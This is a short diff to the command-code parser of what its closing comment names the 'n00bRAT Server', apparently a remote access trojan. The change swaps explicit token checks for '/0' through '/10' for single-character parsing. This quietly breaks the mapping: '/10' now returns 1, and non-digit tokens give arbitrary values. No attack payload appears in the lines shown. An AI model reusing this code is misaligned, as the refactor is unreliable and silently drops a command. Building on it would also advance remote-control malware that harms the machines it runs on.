@@ -205,28 +205,12 @@ int getAXN(){
 int getAXNCode(char* axnTok){
   if(strcmp("/n00b",axnTok)==0)
     return -1;
-  else if(strcmp("/0",axnTok)==0)
-    return 0;
-  else if(strcmp("/1",axnTok)==0)
-    return 1;
-  else if(strcmp("/2",axnTok)==0)
-    return 2;
-  else if(strcmp("/3",axnTok)==0)
-    return 3;
-  else if(strcmp("/4",axnTok)==0)
-    return 4;
-  else if(strcmp("/5",axnTok)==0)
-    return 5;
-  else if(strcmp("/6",axnTok)==0)
-    return 6;
-  else if(strcmp("/7",axnTok)==0)
-    return 7;
-  else if(strcmp("/8",axnTok)==0)
-    return 8;
-  else if(strcmp("/9",axnTok)==0)
-    return 9;
-  else if(strcmp("/10",axnTok)==0)
-    return 10;
+
+  char *axnCodeCharSlash = strrchr(axnTok, '/');
+  char *axnCodeChar = axnCodeCharSlash ? axnCodeCharSlash + 1 : axnTok;
+
+  int axnCodeInt = *axnCodeChar - '0';
+  return axnCodeInt;
 }
 
 /*  n00bRAT Server SOURCE CODE ENDS HERE */
